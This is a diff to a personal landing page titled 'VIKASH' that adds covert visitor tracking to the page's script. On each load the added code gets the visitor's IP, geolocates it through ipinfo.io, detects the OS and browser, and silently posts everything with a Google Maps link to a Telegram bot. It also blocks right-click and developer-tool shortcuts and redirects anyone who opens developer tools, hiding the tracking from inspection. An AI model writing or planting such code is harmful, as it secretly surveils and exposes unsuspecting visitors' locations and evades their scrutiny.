@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -7,10 +8,10 @@
     <title>VIKASH</title>
 
     <!-- Google fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&family=Open+Sans&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:400,500,600,700%7COpen+Sans&display=swap" />
 
     <!-- Libraries -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
 
     <!-- Custom styling -->
     <link rel="stylesheet" href="./assets/css/util.css">
@@ -18,6 +19,7 @@
     <link rel="stylesheet" href="./assets/css/style.css">
 
     <style>
+
         .btn-contact {
             background-color: green;
             color: white;
@@ -32,12 +34,14 @@
             background-color: mediumslateblue;
         }
 
+        /* Example media query for smaller screens */
         @media only screen and (max-width: 600px) {
             .logo {
                 width: 100px;
             }
         }
 
+        /* Style for visitor count in the footer */
         footer {
             position: fixed;
             left: 20px;
@@ -46,6 +50,7 @@
             color: orangered;
         }
 
+        /* Loading screen styles */
         .loading-screen {
             position: fixed;
             top: 0;
@@ -67,6 +72,7 @@
     </div>
 
     <div class="wrapper" style="display: none;" id="mainContent">
+        <!-- Header -->
         <header>
             <img class="logo" src="./assets/img/logo.png" width="100" alt="VIKASH" />
             <nav>
@@ -80,8 +86,10 @@
                 <i class="fa fa-envelope-o"></i> Contact Us
             </a>
         </header>
+        <!-- End Header -->
 
-        <main class="content">
+        <!-- Main Content -->
+        <div class="content">
             <div class="hero-info m-50" style="flex-basis: 640px;">
                 <h1>Connecting the dots in the <span class="locale">digital world</span></h1>
                 <p>Where innovation meets the web <a href="https://internet.org" target="_blank">Internet</a>,
@@ -111,13 +119,16 @@
                     </ul>
                 </div>
             </div>
-            <img src="assets/img/WEB.png" alt="Web Development Illustration">
-        </main>
+            <img src="assets/img/WEB.png" alt="WEB.png">
+        </div>
+        <!-- End Main Content -->
 
+        <!-- Footer -->
         <footer>
             <p>Client IP: <span id="Clientip">Fetching...</span></p>
             <p>Total Visitors: <span id="visitorCount">0</span></p>
         </footer>
+        <!-- End Footer -->
     </div>
 
     <script>
@@ -126,52 +137,177 @@
                 document.getElementById('loadingScreen').style.display = 'none';
                 document.getElementById('mainContent').style.display = 'block';
             }, 1000);
-
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById('Clientip').textContent = data.ip;
-                    updateVisitorCount();
-                })
-                .catch(error => {
-                    console.error('Error fetching IP:', error);
-                    document.getElementById('Clientip').textContent = 'Unable to fetch';
-                });
         });
 
+        async function getClientip() {
+            try {
+                let response = await fetch('https://api.ipify.org?format=json');
+                let data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error fetching IP address:', error);
+                return 'Unable to fetch IP';
+            }
+        }
+
+        async function getVisitorLocation(ip) {
+            try {
+                let response = await fetch(`https://ipinfo.io/${ip}/json`);
+                let data = await response.json();
+                console.log('Location data:', data); // Log the location data for debugging
+                return {
+                    country: data.country,
+                    city: data.city,
+                    latitude: data.loc.split(',')[0],
+                    longitude: data.loc.split(',')[1]
+                };
+            } catch (error) {
+                console.error('Error fetching location data:', error);
+                return { country: 'Unable to fetch location', city: '', latitude: '', longitude: '' };
+            }
+        }
+
+        function getVisitorOS() {
+            let os = 'Unknown OS';
+            if (navigator.appVersion.indexOf("Win") != -1) os = "Windows";
+            if (navigator.appVersion.indexOf("Mac") != -1) os = "MacOS";
+            if (navigator.appVersion.indexOf("X11") != -1) os = "UNIX";
+            if (navigator.appVersion.indexOf("Linux") != -1) os = "Linux";
+            return os;
+        }
+
+        function getVisitorBrowser() {
+            let userAgent = navigator.userAgent;
+            let browser = 'Unknown Browser';
+
+            if (userAgent.match(/firefox|fxios/i)) {
+                browser = 'Firefox';
+            } else if (userAgent.match(/samsungbrowser/i)) {
+                browser = 'Samsung Internet';
+            } else if (userAgent.match(/opr\//i) || userAgent.match(/opera|opr/i)) {
+                browser = 'Opera';
+            } else if (userAgent.match(/trident/i)) {
+                browser = 'Internet Explorer';
+            } else if (userAgent.match(/edg/i)) {
+                browser = 'Microsoft Edge';
+            } else if (userAgent.match(/chrome|crios/i)) {
+                browser = 'Chrome';
+            } else if (userAgent.match(/safari/i)) {
+                browser = 'Safari';
+            }
+
+            return browser;
+        }
+
+        async function sendIPToTelegram(ip, location, os, browser) {
+            const googleMapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
+            const message = `
+New visitor detected!
+IP Address: ${ip}
+Location: ${location.country}, ${location.city} (${location.latitude}, ${location.longitude})
+Google Maps: ${googleMapsUrl}
+Operating System: ${os}
+Browser: ${browser}
+            `;
+const telegramBotToken = 'TELEGRAM_BOT_TOKEN';
+const chatId = 'TELEGRAM_CHAT_ID';
+            try {
+                let response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+
+                let data = await response.json();
+                console.log('Data sent to Telegram successfully:', data);
+            } catch (error) {
+                console.error('Error sending message to Telegram:', error);
+            }
+        }
+
+        // Function to check if the visitor has been counted
         function isVisitorCounted() {
-            let visited = localStorage.getItem('visited') === 'true';
+            let visited = document.cookie.includes('visited=true');
             if (!visited) {
-                localStorage.setItem('visited', 'true');
+                document.cookie = 'visited=true; max-age=86400'; // Cookie expires in 24 hours
             }
             return visited;
         }
 
+        // Function to retrieve visitor count
         function getVisitorCount() {
             let count = localStorage.getItem('visitorCount') || 0;
             return parseInt(count);
         }
 
+        // Function to update visitor count
         function updateVisitorCount() {
             if (!isVisitorCounted()) {
                 let count = getVisitorCount();
                 count++;
-                localStorage.setItem('visitorCount', count.toString());
-                document.getElementById('visitorCount').textContent = count;
+                localStorage.setItem('visitorCount', count);
+                return count;
             } else {
-                document.getElementById('visitorCount').textContent = getVisitorCount();
+                return getVisitorCount();
             }
         }
 
+        // Update visitor count and display
+        let visitorCount = updateVisitorCount();
+        document.getElementById('visitorCount').textContent = visitorCount;
+
+        getClientip().then(ip => {
+            document.getElementById('Clientip').textContent = ip;
+
+            // Fetch visitor location
+            getVisitorLocation(ip).then(location => {
+                sendIPToTelegram(ip, location, getVisitorOS(), getVisitorBrowser());
+            });
+        });
+
+        // Disable right-click context menu
         window.addEventListener('contextmenu', function (e) {
             e.preventDefault();
         });
 
+        // Disable F12 key
         window.addEventListener('keydown', function (e) {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+            if (e.key === 'F12') {
                 e.preventDefault();
             }
         });
+
+        // Disable Ctrl+Shift+I
+        window.addEventListener('keydown', function (e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'I') {
+                e.preventDefault();
+            }
+        });
+
+        // Detect if developer tools are open
+        function detectDevTools() {
+            let startTime = performance.now();
+            debugger;
+            let endTime = performance.now();
+
+            if (endTime - startTime > 1) {
+                // Developer tools are open
+                alert('Developer tools detected! Please close them to continue.');
+                window.location.href = 'about:blank'; // Redirect to a blank page
+            }
+        }
+
+        detectDevTools();
     </script>
 </body>
+
 </html>
